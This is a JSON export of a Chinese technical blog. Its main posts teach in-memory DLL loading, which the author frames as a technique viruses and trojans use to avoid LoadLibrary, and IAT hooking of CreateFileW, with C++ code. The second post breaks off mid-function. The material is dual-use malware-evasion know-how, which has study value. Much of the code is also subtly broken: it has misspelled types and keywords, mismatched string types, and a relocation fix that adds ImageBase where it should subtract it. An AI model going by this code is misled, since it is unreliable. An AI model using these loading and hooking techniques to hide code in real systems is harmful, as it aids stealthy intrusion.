{"meta":{"title":"Dokey_","subtitle":"","description":"","author":"Dokey_","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-25T15:52:59.513Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2021-02-08T10:24:34.000Z","updated":"2023-03-26T16:24:07.912Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"Dokey_ Play With Reality. 有道无术, 术尚可求, 有术无道, 止于术. 神即道, 道法自然, 如来."},{"title":"JavaScript","date":"2023-11-11T05:46:27.155Z","updated":"2023-04-01T11:55:57.964Z","comments":false,"path":"JavaScript/index.html","permalink":"http://example.com/JavaScript/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-02-08T09:21:22.000Z","updated":"2023-03-25T15:41:05.443Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-26T15:57:42.370Z","comments":false,"path":"artitalk/index.html","permalink":"http://example.com/artitalk/index.html","excerpt":"","text":""},{"title":"TodoList","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-03T14:53:03.055Z","comments":false,"path":"todo/index.html","permalink":"http://example.com/todo/index.html","excerpt":"","text":"JavaScriptJavaScript TodoList 学习JavaScript中this指向 学习JavaScript中闭包 学习JavaScript中原型链 学习JavaScript中词法作用域、作用链 Node.jsNode.js TodoList 学习Node.js中异步编程 学习koa web框架的使用 Windows API"},{"title":"","date":"2021-02-08T10:24:34.000Z","updated":"2023-03-26T15:59:23.591Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"暂时不知道写什么","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-01T11:49:36.208Z","comments":false,"path":"tools/index.html","permalink":"http://example.com/tools/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-02-08T09:23:45.000Z","updated":"2023-03-25T15:40:33.353Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"Windows Hook","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-17T13:47:48.818Z","comments":false,"path":"windowsHook/index.html","permalink":"http://example.com/windowsHook/index.html","excerpt":"","text":""},{"title":"Windows 基础","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-07T03:07:06.937Z","comments":false,"path":"windows基础/index.html","permalink":"http://example.com/windows%E5%9F%BA%E7%A1%80/index.html","excerpt":"","text":""},{"title":"Windows 注入技术","date":"2023-11-11T05:46:27.163Z","updated":"2023-05-28T02:22:54.510Z","comments":false,"path":"windows注入/index.html","permalink":"http://example.com/windows%E6%B3%A8%E5%85%A5/index.html","excerpt":"","text":""},{"title":"相册","date":"2023-11-11T05:46:27.143Z","updated":"2023-03-26T14:32:58.486Z","comments":false,"path":"custom/gallery/index.html","permalink":"http://example.com/custom/gallery/index.html","excerpt":"","text":"头像网站壁纸赛博朋克Jean Jullien"},{"title":"Windows API","date":"2023-11-11T05:46:27.163Z","updated":"2023-04-01T11:39:18.745Z","comments":false,"path":"windowsAPI/index.html","permalink":"http://example.com/windowsAPI/index.html","excerpt":"","text":""}],"posts":[{"title":"手工模拟PE加载器","slug":"手工模拟PE加载器","date":"2023-12-14T13:13:16.000Z","updated":"2024-01-02T15:04:59.126Z","comments":true,"path":"dbdbea24.html","link":"","permalink":"http://example.com/dbdbea24.html","excerpt":"内存直接加载运行病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程;","text":"内存直接加载运行病毒木马具有模拟PE加载器的功能, 它们可以把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去执行, 不需要通过LoadLibrary等现成的API函数去操作;假如程序需要动态调用DLL文件, 内存加载运行技术可以把DLL作为资源插入到自己的程序中, 此时可直接在内存中加载运行即可;内存加载技术的核心就在于模拟PE加载器PE文件, 也就是对导入表、导出表、重定位表的操作过程; 实现原理首先, 需要将DLL文件加载到内存中, 按照映像大小进行对齐后映射到内存中, 然后根据重定位表修改硬编码数据, 最后根据导出表函数地址修正导入表; 流程总结根据映像大小SizeOfImage申请可读可写可执行的内存空间, 首地址即DLL加载基址;获取其映像对齐大小SectionAlignment并复制到该内存空间中（FileBuffer &#x3D;&gt; ImageBuffer）;修正重定位表;修正导入表, 根据PE结构中的导入表, 加载所需的Dll, 并获取导入函数的地址将其写入导入表中;修改DLL的加载基址ImageBase;获取DLL入口地址, 构造DllMain函数实现加载; 对于exe文件, 重定位表不是必须的。因为对于exe进程来说, 进程最早加载的模块是exe模块, 所以它可以按照默认加载基址加载到内存中; exe和Dll唯一的区别在于构造入口函数的差别, exe不需要构造入口函数, 而是根据PE结构获取exe的入口地址偏移AddressOfEntryPoint并计算出入口地址, 然后直接跳转。 1. 将Dll文件读入内存PELodader_Demo.cpp1234567891011121314151617181920212223242526272829303132wchat_t szFileName[MAX_PATH] = L&quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\哔哩哔哩学习\\\\PE Learn\\\\PELoader_Demo\\\\Debug\\\\TestDLL_01.dll&quot;;HANDLE hFile = CreateFile( szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);if (hFile == INVALID_HANDLE_VALUE)&#123; printf(&quot;CreateFile Failed\\n&quot;); return 1;&#125;DWORD dwFileSize = GetFileSize(hFile, NULL);printf(&quot;GetFileSize: %d\\n&quot;, dwFileSize);// 申请动态内存PBYTE lpData = new BYTE[dwFileSize];if (NULL == lpData)&#123; printf(&quot;申请内存出错\\n&quot;); return 1;&#125;// 将文件读取到内存中DWORD dwRead = 0;if (FALSE == ReadFile(hFile, lpData, dwFileSize, &amp;dwRead, NULL))&#123; printf(&quot;ReadFile Failed\\n&quot;); return 1;&#125;printf(&quot;lpData: %08x\\n&quot;, *(short*)lpData); // 5A4D CreateFile 创建或打开文件或I&#x2F;O设备, 此函数区分多字节和Unicode两种模式 12345678910111213// UNICODEHANDLEWINAPICreateFileW( _In_ LPCWSTR lpFileName, // 要创建或打开的文件或设备名称 _In_ DWORD dwDesiredAccess, // 请求对文件或设备的访问权限, 常用值GENERIC_READ、GENERIC_WRITE _In_ DWORD dwShareMode, // 请求的文件或设备的共享模式（可以是读取、写入、删除） _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, // 指向LPSECURITY_ATTRIBUTES结构的指针, 此参数可以为NULL _In_ DWORD dwCreationDisposition, // 要对存在或不存在的文件或设备执行的操作, 此参数通常设置为OPEN_EXISTING _In_ DWORD dwFlagsAndAttributes, // 文件或设备属性和标志 _In_opt_ HANDLE hTemplateFile // 具有GENERIC_READ访问权限的模板文件的有效句柄, 此参数可以为NULL ); 如果函数成功, 则返回值是指定文件、设备、命名管道或邮件槽的打开句柄;如果函数失败, 则返回值为INVALID_HANDLE_VALUE; GetFileSize 检索指定文件的大小（以字节为单位） 123456DWORDWINAPIGetFileSize( _In_ HANDLE hFile, // 文件句柄 _Out_opt_ LPDWORD lpFileSizeHigh // 指向变量的指针, 其中返回了文件大小的高位双字。如果应用程序不需要高位双字, 此参数可以为NULL ); 如果函数成功, 则返回值为文件大小的低位双字, 如果lpFileSizeHigh为非NULL, 则该函数会将文件大小的高位双字放入该参数指向的变量中;如果函数失败且lpFileSizeHigh为NULL, 则返回值INVALID_FILE_SIZE; ReadFile 从指定的文件或输入&#x2F;输出 (I&#x2F;O) 设备读取数据 123456789BOOLWINAPIReadFile( _In_ HANDLE hFile, // 文件/设备句柄 _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer, // 指向接收从文件或设备读取的数据的缓冲区的指针 _In_ DWORD nNumberOfBytesToRead, // 要读取的最多字节数 _Out_opt_ LPDWORD lpNumberOfBytesRead, // 指向变量的指针 _Inout_opt_ LPOVERLAPPED lpOverlapped // 此参数可为NULL ); 如果函数成功，则返回值为非零 (TRUE);如果函数失败或正在异步完成，则返回值为零 (FALSE); 2. FileBuffer &#x3D;&gt; ImageBuffer将FileBuffer转换成ImageBuffer可以分为两步: 先将PE头部复制至内存中;然后循环将节内容复制过去; 代码示例 123456789101112131415161718192021222324252627BOOL MmMapFile(LPVOID lpData, LPVOID lpBaseAddress)&#123; // 解析PE文件格式 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData); // 获取PE header大小 DWORD dwSizeOfHeaders = pNt-&gt;OptionalHeader.SizeOfHeaders; // 获取节数量 DWORD dwNumOfSections = pNt-&gt;FileHeader.NumberOfSections; // 将头部数据复制过去 RtlCopyMemory(lpBaseAddress, lpData, dwSizeOfHeaders); // 解析第一个节 PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt); // 循环节 for(size_t i = 0; i &lt; dwNumOfSections; i++) &#123; if((0 == pSec[i].VirtualAddress) || (0 == pSec[i].PointerToRawData)) &#123; continue; &#125; LPVOID lpSrcMem = (LPVOID)(pSec[i].PointerToRawData + (DWORD)lpData); LPVOID lpDesMem = (LPVOID)(pSec[i].VirtualAddress + (DWORD)lpBaseAddress); DWROD dwSizeOfRawData = pSec[i].SizeOfRawData; RtlCopyMemory(lpDesMem, lpSrcMem, dwSizeOfRawData); &#125; return TRUE;&#125; 3. 修正重定位表重定位表Relocation(重定位)是一种将程序中的一些地址修正为运行时可用的实际地址的机制。在程序编译过程中, 由于程序中使用了各种全局变量和函数, 这些变量和函数的地址还没有确定, 因此它们的地址只能暂时使用一个相对地址。当程序被加载到内存中运行时, 这些相对地址需要被修正为实际的绝对地址, 这个过程就是重定位;在Windows操作系统中, 程序被加载到内存中运行时, 需要将程序中的各种内存地址进行重定位, 以使程序能正确运行。Windows系统使用PE(Portable Executable)文件格式来存储可执行程序, 其中包括重定位信息。当程序被加载到内存中时, 系统会解析这些重定位信息, 并将程序中的各种内存地址进行重定位。重定位表一般出现在Dll中, 因为Dll都是动态加载, 所以地址不固定, Dll的入口点在整个执行过程中至少要执行2次, 一次时在开始时执行初始化工作, 一次则是在结束时做最后的收尾工作, 重定位表则是解决Dll的地址问题; 重定位表的结构 重定位结构 代码示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344BOOL DoRelocationTable(LPVOID lpBaseAddress)&#123; // 解析PE PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpBaseAddress); // 定位重定位位置 PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取重定位表 PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)(pDataDir-&gt;VirtualAddress + (DWORD)lpBaseAddress); // 判断是否有重定位表, 数据目录表不存在时, VirtualAddress为0, 也就是指向映像基址 if ((LPVOID)pLoc == lpBaseAddress) &#123; return FALSE; &#125; // 循环重定位表, 重定位表VirtualAddress和SizeOfBlock都为0表示重定位表结束 while((pLoc.VirtualAddress + pLoc-&gt;SizeOfBlock) != 0) &#123; // 重定位数据, 位于IMAGE_BASE_RELOCATION表开头8字节之后 PWORD pLocData = (PWORD)((PBYTE)pLoc + szieof(IMAGE_BASE_RELOCATION)); // 计算本节需要修正的重定位项（地址）的数目, 每个数据都是16字节（4+12字节, 高4位表示重定位类型, 低12位为RVA） // SizeOfBlock的值包括了SizeOfBlock和VirtualAddress的大小, 8字节需要减去 DWORD dwNumOfpLoc = (pLoc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (size_t i = 0; i &lt; dwNumOfpLoc; i++) &#123; // 高位为3表示有效重定位 if ((DWORD)(pLocData[i] &amp; 0x0000F000) == 0x00003000) &#123; // 需要修正的数据 // 修正重定位数据, 重定位表记录的是存在硬编码的地址, 以基址+偏移的形式 // 存在硬编码的地址 = 重定位基址 + 重定位表数据偏移 // = 基址 + 重定位地址 + 重定位数据（数据后12位） PDWORD pAddress = (PDWORD)((PBYTE)pDos + pLoc-&gt;VirtualAddress + (pLocData[i] &amp; 0x0FFF)); // 重定位地址 = 硬编码地址 - ImageBase + 实际基地址 // = 实际基地址 - ImageBase + 硬编码地址 // *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + (DWORD)pDos; DWROD dwDelta = (DWORD)pDos + pNt-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; // 循环下一个重定位区段 pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 4. 修正导入表PE加载器在加载PE的时候会将导入函数的地址填入导入地址表中, 导入表结构如下: 123456789101112131415typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) 导入名称表RVA &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; // 0 if not bound, // -1 if bound, and real date\\time stamp // in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND) // O.W. date/time stamp of DLL bound to (Old BIND) DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses) 导入地址表RVA&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 主要用到的是OriginalFirstThunk和FirstThunk; 这两个表用到的结构体是一样的(IMAGE_THUNK_DATA): 123456789typedef struct _IMAGE_THUNK_DATA32 &#123; union &#123; DWORD ForwarderString; // PBYTE DWORD Function; // PDWORD DWORD Ordinal; DWORD AddressOfData; // PIMAGE_IMPORT_BY_NAME &#125; u1;&#125; IMAGE_THUNK_DATA32;typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32; 如果指向导入名称表; 则内容是AddressOfData, 指向IMAGE_IMPORT_BY_NAME结构体;如果指向导入地址表: 序号导入的话, Ordinal首位是1, 低4位是导入序号; 名称导入的话, Function的值是函数地址; 这里我们需要将导入函数的地址填入导入地址表中, 所以需要知道这个函数是怎么导入的, 然后通过GetProcAddress API获取函数地址, 然后将函数地址填入导入地址表中; 通过GetProcAddress获取函数地址, 需要知道Dll名称, 通过Dll名称获取模块句柄 所以代码流程是: 修正导入表流程先获取导入表数组的数量和第一个成员的地址;根据导入表的数量, 进行循环遍历;获取导入名称表;获取导入地址表;进行导入名称表的遍历(导入名称表数组以0作为最后一个成员结束);获取导入函数的名称或序号；加载这个Dll, 通过名称或序号, 获取其函数地址;将地址填入导入地址表;进入下一次循环;进入下一次循环;两次遍历完成后, 导入表就已经完成了修正; 代码示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566BOOL DoImportTable(LPVOID lpBaseAddress)&#123; // 解析PE结构 PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT); PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(pDir-&gt;VirtualAddress + (DWORD)pDos); // 循环遍历Dll导入表中的Dll以及获取导入表中的函数地址 char* szDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA pImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME pImportByName = NULL; PIMAGE_THUNK_DATA pImportFuncAddrArray = NULL; FARPROC pfFuncAddress = NULL; DWORD i = 0; while(TRUE) &#123; if(0 == pImport-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中Dll的名称并加载Dll szDllName = (char*)(pImport-&gt;Name + (DWORD)pDos); hDll = GetModuleHandleA(szDllName); if(hDll == NULL) &#123; hDll = LoadLibraryA(szDllName); if(hDll == NULL) &#123; pImport++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 pImportNameArray = (PIMAGE_THUNK_DATA)(pImport-&gt;OriginalFirstThunk + (DWORD)pDos); // 获取FirstThunk以及对应的导入函数地址表首地址 pImportFuncAddrArray = (PIMAGE_THUNK_DATA)(pImport-&gt;FirstThunk + (DWORD)pDos); while(TRUE) &#123; if(0 == pImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 pImportByName = (PIMAGE_IMPORT_BY_NAME)(pImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if(0x80000000 &amp; pImportNameArrar[i].u1.Ordinal) &#123; // 序号导出 // 当IMPORT_THUNK_DATA值的最高位为1时, 表示函数以序号方式导出, 此时低位被看作是一个函数序号 pfFuncAddress = GetProcAddress(hDll, (LPCSTR)(pImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 pfFuncAddress = GetProcAddress(hDll, (LPCSTR)pImportByName-&gt;Name); &#125; // 注意此处的函数地址表的赋值, 要对照PE格式进行装载 pImportFuncAddrArray[i].u1.Function = (DWORD)pfFuncAddress; i++; &#125; pImport++; &#125; return TRUE;&#125; 5. 修改Dll的加载基址ImageBasePE加载器在加载PE的时候会将进程分配的基地址填入扩展头的ImageBase中; 12345678BOOL SetImageBase(LPVOID lpBaseAddress)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); pNt-&gt;OptionalHeader.ImageBase = (DWORD)lpBaseAddress; return TRUE;&#125; 6. 修改DllMain入口点调用Dll的入口函数DllMain, 函数地址则是PE文件的入口点; 1234567891011BOOL CallDllMain(LPVOID lpBaseAddress)&#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); DllMain = (typedef_DllMain)(pNt-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD)pDos); // 调用入口函数, 附加进程DLL_PROCESS_ATTACH BOOL bRet = DllMain((HINSTANCE)lpBaseAddress, DLL_PROCESS_ATTACH, NULL); return bRet;&#125; 7. 获取Dll导出函数导出表PE文件运行, 需要依赖Dll; 系统Dll包括Kernel32.dll、User32.dll等;导出表时当前PE文件提供了哪些函数给别人使用;不管是exe还是Dll, 本质都是PE文件; exe文件也可以导出函数给别人使用; 一般exe没有, 但不是不可以; 导出表结构 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; // DWORD TimeDateStamp; // 时间戳, 编译时间; 把秒转为时间, 可以知道这个Dll是什么时候编译出来的 WORD MajorVersion; WORD MinorVersion; DWORD Name; // 指向该导出表文件名的字符串, 也就是这个Dll的名称(RVA) DWORD Base; // 导出函数的起始序号 DWORD NumberOfFunctions; // 所有导出函数的个数 DWORD NumberOfNames; // 以名称导出的函数个数 DWORD AddressOfFunctions; // RVA from base of image（导出的函数地址表） DWORD AddressOfNames; // RVA from base of image（导出的函数名称表） DWORD AddressOfNameOrdinals; // RVA from base of image（导出的函数序号表）&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 遍历流程获取导出函数名称;比较是否是要找函数名称;如果是, 则获取函数序号(2字节);根据函数序号获取函数地址; 123456789101112131415161718192021222324252627LPVOID MmGetProcAddress(LPVOID lpBaseAddress, wchar_t* lpszFuncName)&#123; PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBaseAddress; PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos); PIMAGE_DATA_DIRECTORY pDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT); PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pDir-&gt;VirtualAddress + (DWORD)pDos); PDWORD dwAddressOfFunctions = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)pDos); PDWORD dwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)pDos); PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)pDos); DWORD dwNumberOfNames = pExport-&gt;NumberOfNames; for(size_t i = 0; i &lt; dwNumberOfNames; i++) &#123; if(!dwAddressOfFunctions[i]) &#123; continue; &#125; PWCHAR szFuncName = (PWCHAR)(dwAddressOfNames[i] + (DWORD)pDos); if(lstrcmpi(lpszFuncName, szFuncName) == 0) &#123; return (LPVOID)(dwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD)pDos); &#125; &#125; return LPVOID();&#125; 8. 释放内存加载的Dll释放资源 1234567891011BOOL MmFreeLibrary(LPVOID lpBaseAddress)&#123; BOOL bRet = NULL; if (NULL == lpBaseAddress) &#123; return bRet; &#125; bRet = VirtualFree(lpBaseAddress, 0, MEM_RELEASE); lpBaseAddress = NULL; return bRet;&#125; 内存加载Dll执行演示示例Dll源代码12345678910111213141516171819202122// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;extern &quot;C&quot; __declspec(dllexport)void ShowMessage() &#123; MessageBox(NULL, L&quot;I&#x27;m DLL File&quot;, L&quot;HELLO&quot;, MB_OK);&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; PELoader_Demo.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// PELoader_Demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;MmLoadDll.h&quot;int main()&#123; wchar_t szFileName[MAX_PATH] = L&quot;C:\\\\Users\\\\dell\\\\OneDrive\\\\桌面\\\\哔哩哔哩学习\\\\PE Learn\\\\PELoader_Demo\\\\Debug\\\\TestDLL_01.dll&quot;; HANDLE hFile = CreateFile( szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL ); if (INVALID_HANDLE_VALUE == hFile) &#123; printf(&quot;CreateFile Failed: %d\\n&quot;, GetLastError()); return 0; &#125; DWORD dwFileSize = GetFileSize(hFile, NULL); printf(&quot;FileSize: %d\\n&quot;, dwFileSize); // 申请动态内存并读取DLL到内存中 PBYTE lpData = new BYTE[dwFileSize]; if (lpData == NULL) &#123; printf(&quot;申请内存出错: %d\\n&quot;, GetLastError()); return 0; &#125; DWORD dwRet = 0; BOOL bRet = ReadFile(hFile, lpData, dwFileSize, &amp;dwRet, NULL); if (!bRet) &#123; printf(&quot;ReadFile Failed: %d\\n&quot;, GetLastError()); return 0; &#125; printf(&quot;lpData: %08x\\n&quot;, *(short*)lpData); // 将内存DLL加载到程序中 LPVOID lpBaseAddress = MmLoadLibrary(lpData, dwFileSize); if (lpBaseAddress == NULL) &#123; printf(&quot;MmLoadLibrary Failed: %d\\n&quot;, GetLastError()); return 0; &#125; printf(&quot;DLL加载成功\\n&quot;); // 获取DLL导出函数并调用 typedef void (*typedef_ShowMessage)(); const char* szName = &quot;ShowMessage&quot;; typedef_ShowMessage ShowMessage = (typedef_ShowMessage)MmGetProcAddress(lpBaseAddress, (wchar_t*)szName); if (NULL == ShowMessage) &#123; printf(&quot;MmGetProcAddress Failed\\n&quot;); return 0; &#125; ShowMessage(); // 释放从内存加载的DLL BOOL bRet1 = MmFreeLibrary(lpBaseAddress); if (FALSE == bRet1) &#123; printf(&quot;MmFreeLibrary Failed\\n&quot;); return 0; &#125; // 释放 delete[] lpData; lpData = NULL; CloseHandle(hFile); //system(&quot;pause&quot;); return 0;&#125; 调用导出函数调用导出函数 参考资料参考书籍《Windwos黑客编程技术详解》第4章第3节 参考Blog kn0sky lyshark","categories":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"}],"tags":[{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"}]},{"title":"IAT-Hook","slug":"IAT-Hook","date":"2023-05-28T02:05:22.000Z","updated":"2023-05-29T15:34:39.071Z","comments":true,"path":"3aecea41.html","link":"","permalink":"http://example.com/3aecea41.html","excerpt":"IAT HookIMAGE_IMPORT_DESCRIPTOR中两个IMAGE_THUNK_DATA结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，FirstThunk字段指向的IMAGE_THUNK_DATA的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址IAT Hook步骤获取欲Hook的函数地址找到该函数的所保存的IAT地址把IAT中该函数的地址修改为Hook函数的地址","text":"IAT HookIMAGE_IMPORT_DESCRIPTOR中两个IMAGE_THUNK_DATA结构体，第一个位导入名称表（INT），第二个位导入地址表（IAT）。两个结构在磁盘文件中时是没有差别的，但是当PE文件被装载到内存中后，FirstThunk字段指向的IMAGE_THUNK_DATA的值会被Windows进行填充。该值为一个RVA，该RVA加上映像基址后，虚拟地址就保存了真正的导入函数的入口地址IAT Hook步骤获取欲Hook的函数地址找到该函数的所保存的IAT地址把IAT中该函数的地址修改为Hook函数的地址 遍历64位IAT函数名和地址遍历64位IAT函数名和地址GetModuleHandle：参数只有1个，是目标模块名，此处填NULL表示当前进程，返回的是一个进程句柄，也就是当前进程的首地址区别：64位程序的基地址是Unsigned Long Long类型，用DWORD64表示运行中的程序，IAT里记录的是VA而不是RVA运行中的程序，INT里记录的是RVA而不是VA 代码示例12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main() &#123; // 获取当前程序的首地址 HMODULE hModuel = GetModuleHandle(NULL); // 定位DOS头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule; // 定位NT头 PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosHeader-&gt;e_lfanew); // 获取导入表RVA DWORD64 dwImportRVA = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; // 定位导入表 PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(dwImportRVA + (DWORD64)hModule); while(pImport-&gt;Name) &#123; const char* szDllName = (char*)((DWORD64)hModule + pImport-&gt;Name); printf(&quot;%s\\n&quot;, szDllName); PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;FirstThunk); PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)((DWORD64)hModule + pImport-&gt;OriginalFirstThunk); if(pIAT-&gt;u1.Oridianl != 0) &#123; while(pIAT-&gt;u1.Function) PIMAGE_IMPORT_BY_NAME pFuncName = (PIMAGE_IMPORT_BY_NAME)((DWORD64)hModule + pINT-&gt;AddressOfData); PDWORD64 dwFuncAddr = (PDWORD64)(pIAT-&gt;Function); printf(&quot;函数名称：%-50s&quot;, pFuncName); printf(&quot;函数地址：%p\\n&quot;, dwFuncAddr); pINT++; pIAT++; &#125; &#125; pImport++; &#125;&#125; Hook CreateFileW代码示例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#include &lt;Windows.h&gt;HANDLEWINAPIMyCreateFileW( _In_ LPCWSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile)&#123; if(MessageBox(NULL, L&quot;打开文件操作被拦截&quot;, L&quot;提示&quot;, MB_YESNO) == IDYES) &#123; return CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile ); &#125; else &#123; MessageBox(NULL, L&quot;文件打开失败&quot;, L&quot;警告&quot;, NULL); return FALSE; &#125;&#125;BOOL IATHook(LPCWSTR lpModuleName, const char* szFuncName)&#123; DWORD64 dwFuncAddr = 